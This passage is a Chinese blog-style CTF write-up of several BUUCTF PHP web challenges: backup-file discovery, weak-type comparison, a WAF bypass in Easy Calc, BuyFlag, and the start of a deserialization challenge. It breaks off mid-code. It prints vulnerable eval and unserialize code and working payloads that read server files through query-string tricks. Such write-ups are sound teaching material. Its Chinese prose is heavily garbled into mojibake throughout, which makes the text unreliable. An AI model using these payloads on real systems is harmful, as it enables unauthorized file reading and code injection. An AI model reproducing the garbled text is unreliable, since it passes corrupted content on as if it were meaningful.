alt="1"><br>ÁÑ∂ÂêéÂ∞±‰∫ÜËß£‰∏Ä‰∏ãÂ∏∏ËßÅÂ§á‰ªΩÊñá‰ª∂ÊúâÂì™‰∫õÂêéÁºÄÂêçÔºü</p><blockquote><p>Â∏∏ËßÅÁöÑÂ§á‰ªΩÊñá‰ª∂ÂêéÁºÄÂêçÔºö‚Äú.git‚Äù „ÄÅ‚Äú.svn‚Äù„ÄÅ‚Äú .swp‚Äù ‚Äú.~‚Äù„ÄÅ‚Äú.bak‚Äù„ÄÅ‚Äú.bash_history‚Äù„ÄÅ‚Äú.bkf‚Äù</p></blockquote><p>ÂèØ‰ª•Áî®<strong>dirsearch</strong>Êâ´‰∏Ä‰∏ã</p><blockquote><p>‰ΩøÁî®</p></blockquote><blockquote><p>-u ÊåáÂÆöurl</p></blockquote><blockquote><p>-e ÊåáÂÆöÁΩëÁ´ôËØ≠Ë®Ä</p></blockquote><blockquote><p>-w ÂèØ‰ª•Âä†‰∏äËá™Â∑±ÁöÑÂ≠óÂÖ∏ÔºàÂ∏¶‰∏äË∑ØÂæÑÔºâ</p></blockquote><blockquote><p>-r ÈÄíÂΩíË∑ëÔºàÊü•Âà∞‰∏Ä‰∏™ÁõÆÂΩïÂêéÔºåÂú®ÁõÆÂΩïÂêéÂú®ÈáçÂ§çË∑ëÔºåÂæàÊÖ¢Ôºå‰∏çÂª∫ËÆÆÁî®Ôºâ</p></blockquote><p>ËøõÂÖ•dirsearchÁõÆÂΩïÂêé</p><p>ÊâßË°å.&#x2F;dirsearch.py -u 127.0.0.1 -e phpÁ±ª‰ººÁöÑÁõÆÂΩï</p><p>ËøôÈáåÂ∞±‰∏çÊâ´Êèè‰∫ÜÔºåÊúÄÂêéÊâ´ÊèèÂà∞<a href="http://www.zip,Âú®ÂêéÁºÄÂä†‰∏ä‰ªñ‰πãÂêé‰øùÂ≠òÊñá‰ª∂/">www.zipÔºåÂú®ÂêéÁºÄÂä†‰∏ä‰ªñ‰πãÂêé‰øùÂ≠òÊñá‰ª∂</a><br><img src="https://img-blog.csdnimg.cn/d8843158602b47acac1b90a490dcd436.png" alt="2"><br>ÂæóÂà∞5‰∏™Êñá‰ª∂„ÄÇ</p><blockquote><p>class.phpÊñá‰ª∂</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂèØ‰ª•ÁúãÂà∞Ôºå‰∏ªË¶ÅÊÑèÊÄùÂ∞±ÊòØÂΩì<strong>username</strong>Âº∫Áõ∏Á≠â‰∫é<strong>admin</strong>Ôºå<strong>password</strong>Âº±Áõ∏Á≠â‰∫é<strong>100</strong>Êó∂ÁªôÂá∫flagÔºå‰ΩÜÊòØÈúÄË¶ÅÊ≥®ÊÑè‰∏ÄÁÇπÁöÑÂ∞±ÊòØÁ®ãÂ∫èÂú®ÊâßË°åÊó∂Ôºå‰ºöÂ∞Ü<strong>username</strong>ËµãÂÄº‰∏∫<strong>guest</strong>ÔºåËøôÊÑèÂë≥ÁùÄ‰∏çËÉΩÂæóÂá∫flag„ÄÇÂÖàÊîæÂú®ËøôÈáåÔºåÁúãÁúãÂÖ∂‰ªñÊñá‰ª∂„ÄÇ</p><blockquote><p>index.phpÊñá‰ª∂</p></blockquote><p>ÂÖ∂‰∏≠Êúâ‰∏ÄÊÆµÂÜÖÂÆπÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Êàë‰ª¨ÈÄöËøágetËØ∑Ê±Ç‰º†ÂÖ•selectÂèÇÊï∞ÔºåÂπ∂‰∏îÂÄºË¢´ÂèçÂ∫èÂàóÂåñ‰∫ÜÔºà<strong>unserialize</strong>Ôºâ</p><p>ÂÆûÂú®‰∏ç‰ºö‰∫ÜÔºåÂÜôÈ¢òÊ≠•È™§ËØ∑ÂèÇËÄÉ<a href="https://zhuanlan.zhihu.com/p/366455343">Ëøô‰ΩçÂ∏àÂÇÖ</a></p><h3 id="Áü•ËØÜÁÇπ"><a href="#Áü•ËØÜÁÇπ" class="headerlink" title="Áü•ËØÜÁÇπ"></a>Áü•ËØÜÁÇπ</h3><p><strong>phpÂ∫èÂàóÂåñÂØπË±°ÂèÇËÄÉËßÑÂàô</strong></p><blockquote><p>O:4:‚ÄùUser‚Äù:2:{s:3:‚Äùage‚Äù;i:20;s:4:‚Äùname‚Äù;s:4:‚Äùdaye‚Äù;}<br>ÂØπË±°Á±ªÂûã:ÈïøÂ∫¶:‚ÄùÁ±ªÂêç‚Äù:Á±ª‰∏≠ÂèòÈáèÁöÑ‰∏™Êï∞:{Á±ªÂûã:ÈïøÂ∫¶:‚ÄùÂÄº‚Äù;Á±ªÂûã:ÈïøÂ∫¶:‚ÄùÂÄº‚Äù;‚Ä¶‚Ä¶}<br>ÂèòÈáèÂèäÂØπË±°Á±ªÂûãÂèÇËÄÉ<br>a - array         b - boolean<br>d - double         i - integer<br>o - common object     r - reference<br>s - string         C - custom object<br>O - class         N - null<br>R - pointer reference   U - unicode string</p></blockquote><p><strong>private Â£∞ÊòéÁöÑÂ≠óÊÆµÂú®Â∫èÂàóÂåñÊó∂ÔºåÈúÄË¶ÅÊ≥®ÊÑèÔºö</strong></p><blockquote><p>   privateÂ£∞ÊòéÁöÑÂ≠óÊÆµ‰∏∫ÁßÅÊúâÂ≠óÊÆµÔºåÂè™Âú®ÊâÄÂ£∞ÊòéÁöÑÁ±ª‰∏≠ÂèØËßÅÔºåÂú®ËØ•Á±ªÁöÑÂ≠êÁ±ªÂíåËØ•Á±ªÁöÑÂØπË±°ÂÆû‰æã‰∏≠Âùá‰∏çÂèØËßÅ„ÄÇ<br>   Âõ†Ê≠§ÁßÅÊúâÂ≠óÊÆµÁöÑÂ≠óÊÆµÂêçÂú®Â∫èÂàóÂåñÊó∂ÔºåÁ±ªÂêçÂíåÂ≠óÊÆµÂêçÂâçÈù¢ÈÉΩ‰ºöÂä†‰∏ä\0ÔºàÂç≥%00ÔºâÁöÑÂâçÁºÄ„ÄÇÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶‰πüÂåÖÊã¨ÊâÄÂä†ÂâçÁºÄÁöÑÈïøÂ∫¶ÔºåÂ¶Ç‰∏ã</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00User%00age"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00User%00name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"daye"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token comment"># 9=7+2  10=8+2  ÂÖ∂‰∏≠2‰∏∫‰∏§‰∏™ÂâçÁºÄ</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">È≠îÊúØÊñπÊ≥ï</a></p><blockquote><p>‰∏ãÂàóÊñπÊ≥ïÂêçË¢´ËÆ§‰∏∫ÊòØÈ≠îÊúØÊñπÊ≥ïÔºö __construct() „ÄÅ __destruct() „ÄÅ __call() „ÄÅ __callStatic() „ÄÅ __get() „ÄÅ __set() „ÄÅ __isset() „ÄÅ __unset() „ÄÅ __sleep() „ÄÅ __wakeup() „ÄÅ __serialize() „ÄÅ __unserialize() „ÄÅ __toString() „ÄÅ __invoke() „ÄÅ __set_state() „ÄÅ __clone() „ÄÅ __debugInfo() „ÄÇ </p></blockquote><p><strong>Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñÁÆÄÂçï‰ªãÁªç</strong></p><blockquote><p>Â∫èÂàóÂåñ:ÊääÂ§çÊùÇÁöÑÊï∞ÊçÆÁ±ªÂûãÂéãÁº©Âà∞‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‰∏≠ Êï∞ÊçÆÁ±ªÂûãÂèØ‰ª•ÊòØÊï∞ÁªÑÔºåÂ≠óÁ¨¶‰∏≤ÔºåÂØπË±°Á≠â  ÂáΩÊï∞ : serialize()</p></blockquote><blockquote><p>ÂèçÂ∫èÂàóÂåñ:ÊÅ¢Â§çÂéüÂÖàË¢´Â∫èÂàóÂåñÁöÑÂèòÈáè ÂáΩÊï∞: unserialize()</p></blockquote><h2 id="ACTF2020-Êñ∞ÁîüËµõ-BackupFile"><a href="#ACTF2020-Êñ∞ÁîüËµõ-BackupFile" class="headerlink" title="[ACTF2020 Êñ∞ÁîüËµõ]BackupFile"></a>[ACTF2020 Êñ∞ÁîüËµõ]BackupFile</h2><p>ÊâìÂºÄÈ¢òÁõÆÂêéÊòØÁúüÁöÑÂπ≤ÂáÄÔºåÊ≤°Êúâ‰∏ÄÁÇπ‰ø°ÊÅØ„ÄÇÊ≤°ÊúâÊ≥®ÊÑèÂà∞ÁöÑ‰∏ÄÁÇπÂ∞±ÊòØÈ¢òÁõÆÂêçÁß∞ÔºÅ<strong>backup file</strong>‰∏≠ÊñáÊÑèÊÄùÂ∞±ÊòØ<strong>Â§á‰ªΩÊñá‰ª∂</strong>ËØ¥ÊòéÂ≠òÂú®Â§á‰ªΩÊñá‰ª∂„ÄÇ</p><blockquote><p>ÁΩëÁ´ôÂ§á‰ªΩÂéãÁº©Êñá‰ª∂<br>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html</p></blockquote><p>ÊãødirsearchÊâ´‰∏Ä‰∏ã<br><img src="https://img-blog.csdnimg.cn/9acc437c03744836b70d8748bf4d6199.png" alt="1"><br>ÈúÄË¶ÅÁ≠âÂæÖ‰∏Ä‰∏™Êº´ÈïøÁöÑÊó∂Èó¥<img src="https://img-blog.csdnimg.cn/78f243565bdf4940bebebe089d87d9a0.png" alt="2"><br>ÊúÄÂêéÊâæÂà∞Ëøô‰∏™Êñá‰ª∂‰øùÂ≠ò‰∏ãÊù•ÂæóÂà∞‰ª•‰∏ãÂÜÖÂÆπÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Â∞±ÊòØÂº±Á±ªÂûãÁöÑÈóÆÈ¢òÔºå<br><img src="https://img-blog.csdnimg.cn/af49efe60a034006a4f3db1994dacea2.png" alt="3"><br>ÂæóÂà∞flagÔºö<code>flag&#123;d21c38ea-d364-4047-a47c-4527c09a3937&#125; </code></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="https://img-blog.csdnimg.cn/7dbc9a95029643b6ac0fbaa2bc5acc41.png" alt="1"><br>Êü•ÁúãÊ∫êÁ†Å<br><img src="https://img-blog.csdnimg.cn/67df4dfceb3343c0b3ab1ee039933a14.png" alt="1"><br>Êúâ‰∏™urlÊèêÁ§∫Ôºö<code>calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val())</code></p><blockquote><p>$(‚Äú#content‚Äù).val() ÊòØ‰ªÄ‰πàÊÑèÊÄùÔºö<br>Ëé∑Âèñid‰∏∫contentÁöÑHTMLÊ†áÁ≠æÂÖÉÁ¥†ÁöÑÂÄº,ÊòØJQuery, $(‚Äú#content‚Äù)Áõ∏ÂΩì‰∫édocument.getElementById(‚Äúcontent‚Äù); $(‚Äú#content‚Äù).val()Áõ∏ÂΩì‰∫é document.getElementById(‚Äúcontent‚Äù).value;</p></blockquote><p>Áúã‰∏Ä‰∏ãcalc.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>http://node4.buuoj.cn:28863/calc.php?num=1</code><br>ÊúâÂõûÊòæ<br><code>http://node4.buuoj.cn:28863/calc.php?num=a</code><br>Êó†ÂõûÊòæ<br><img src="https://img-blog.csdnimg.cn/beaf25ecc9db463c87bdc14b7f82bd47.png" alt="2"><br>Áî±‰∫éÂêéÁª≠Êàë‰ª¨Ë¶ÅÊâæÁöÑflagËÇØÂÆöÂ∏¶Â≠óÊØç<br>Êó†ËÆ∫ÊÄé‰πàÊ≥®ÂÖ•ÈÉΩÊòØË¢´WAF‰∫Ü„ÄÇÁúã‰∫Ü‰∏Ä‰∏ãÂ∏àÂÇÖ‰ª¨ÁöÑÊñáÁ´†ÔºåËøôÈáåÊ∂âÂèäÂà∞‰∏Ä‰∏™Áü•ËØÜÁÇπ<a href="https://blog.csdn.net/qq_45521281/article/details/105871192">Âà©Áî®PHPÁöÑÂ≠óÁ¨¶‰∏≤Ëß£ÊûêÁâπÊÄßÁªïËøáWaf</a></p><blockquote><p>PHPÈúÄË¶ÅÂ∞ÜÊâÄÊúâÂèÇÊï∞ËΩ¨Êç¢‰∏∫ÊúâÊïàÁöÑÂèòÈáèÂêçÔºåÂõ†Ê≠§Âú®Ëß£ÊûêÊü•ËØ¢Â≠óÁ¨¶‰∏≤Êó∂ÔºåÂÆÉ‰ºöÂÅö‰∏§‰ª∂‰∫ãÔºö</p><p>1.Âà†Èô§ÂâçÂêéÁöÑÁ©∫ÁôΩÁ¨¶ÔºàÁ©∫Ê†ºÁ¨¶ÔºåÂà∂Ë°®Á¨¶ÔºåÊç¢Ë°åÁ¨¶Á≠âÁªüÁß∞‰∏∫Á©∫ÁôΩÁ¨¶Ôºâ<br>2.Â∞ÜÊüê‰∫õÂ≠óÁ¨¶ËΩ¨Êç¢‰∏∫‰∏ãÂàíÁ∫øÔºàÂåÖÊã¨Á©∫Ê†ºÔºâ</p></blockquote><p>numË¢´ÈôêÂà∂‰∫ÜÔºå‰ΩÜÂú®numÂâçÈù¢Âä†‰∏™Á©∫Ê†ºÔºåwafÂ∞±ÁÆ°‰∏çÁùÄ‰∫ÜÔºåÂõ†‰∏∫wafÂè™ÊòØÈôêÂà∂‰∫ÜnumÔºåwafÂπ∂Ê≤°ÊúâÈôêÂà∂‚Äô num‚ÄôÔºåÂΩìphpËß£ÊûêÁöÑÊó∂ÂÄôÔºåÂèà‰ºöÊää‚Äô num‚ÄôÂâçÈù¢ÁöÑÁ©∫Ê†ºÂéªÊéâÂú®Ëß£ÊûêÔºåÂà©Áî®ËøôÁÇπÊù•‰∏ä‰º†ÈùûÊ≥ïÂ≠óÁ¨¶<br>ÂΩìÊü•ÊâæÊ†πÁõÆÂΩïÊñá‰ª∂Êó∂Ë¶ÅÁî®Âà∞<code>print_r(scandir(&#39;/&#39;))c</code><br>‰ªécalc.phpÂèØ‰ª•ÁúãÂá∫<code>&quot;``&#39;</code>Ë¢´ËøáÊª§‰∫ÜÔºåËøôÊòØË¶ÅÊÉ≥Âà∞Áî®ASCIIÁ†Å</p><p><code>http://node4.buuoj.cn:28863/calc.php? num=print_r(scandir(chr(47)))</code><br><img src="https://img-blog.csdnimg.cn/48e5899d3e6f42f497fdd879518a8090.png" alt="4"><br>Âú®flagÂú®f1aggÊñá‰ª∂‰∏≠<br>ÂØπÁÖßASCIIÁ†ÅË°®ÂÜôÂÖ•<br><code>http://node4.buuoj.cn:28863/calc.php? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code><br>ÂæóÂà∞flag.<br><strong>flag{c7fa0f73-f1a2-4d7c-b3bb-ea6c6da4697c}</strong></p><h2 id="ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-BuyFlag"><a href="#ÊûÅÂÆ¢Â§ßÊåëÊàò-2019-BuyFlag" class="headerlink" title="[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]BuyFlag"></a>[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]BuyFlag</h2><p><img src="https://img-blog.csdnimg.cn/2d6553026ec84e11a2b51bc17eff592e.png" alt="1"><img src="https://img-blog.csdnimg.cn/282f01c25350408ebbe4e522ade24a94.png" alt="5"></p><p><img src="https://img-blog.csdnimg.cn/d46d326609cb44ba90c146463434cf9b.png" alt="2"><br>ÊÄé‰πàÊâçËÉΩËØÅÊòé‰Ω†ÊòØ‰∏ÄÂêçÂ≠¶ÁîüÂë¢Ôºücookie‰∏≠Êúâ‰ø°ÊÅØ<br><img src="https://img-blog.csdnimg.cn/19e411b9ed5d45e4a654dc8ab5c55c5b.png" alt="3"><br>0Êîπ‰∏∫1<br><img src="https://img-blog.csdnimg.cn/72e319f95be24bedbac48dce902169b1.png" alt="5"><br>ÂØÜÁ†ÅÊòØ‰ªÄ‰πàÔºüÊü•ÁúãÊ∫êÁ†Å<br><img src="https://img-blog.csdnimg.cn/0a9b22d22ae943a6a0a262c6586a4189.png" alt="6"><strong>&#x3D;&#x3D;<strong>Âº±Áõ∏Á≠âÊØîËæÉÔºåpost‰º†ÂèÇÔºö<br><img src="https://img-blog.csdnimg.cn/85f4ea6e2307467993ae5c0da4f24a12.png" alt="7"><br>ÁßëÂ≠¶ËÆ°Êï∞Ê≥ï1e9<br><img src="https://img-blog.csdnimg.cn/a233cb5e10da40559fb2e04d30af20a2.png" alt="8"><br>ÊàñËÄÖÊï∞ÁªÑÁªïËøá</strong>password&#x3D;404jk&amp;money[]&#x3D;1000000000;</strong><a href="https://blog.csdn.net/cherrie007/article/details/77473817">strcmpÂáΩÊï∞ÊºèÊ¥û</a></p><h2 id="ÁΩëÈºéÊùØ-2020-ÈùíÈæôÁªÑ-AreUSerialzÔºàphpÂèçÂ∫èÂàóÂåñÔºâ"><a href="#ÁΩëÈºéÊùØ-2020-ÈùíÈæôÁªÑ-AreUSerialzÔºàphpÂèçÂ∫èÂàóÂåñÔºâ" class="headerlink" title="[ÁΩëÈºéÊùØ 2020 ÈùíÈæôÁªÑ]AreUSerialzÔºàphpÂèçÂ∫èÂàóÂåñÔºâ"></a>[ÁΩëÈºéÊùØ 2020 ÈùíÈæôÁªÑ]AreUSerialzÔºàphpÂèçÂ∫èÂàóÂåñÔºâ</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>  <span class="token comment">//protected: Âèó‰øùÊä§Á±ªÂûã</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token 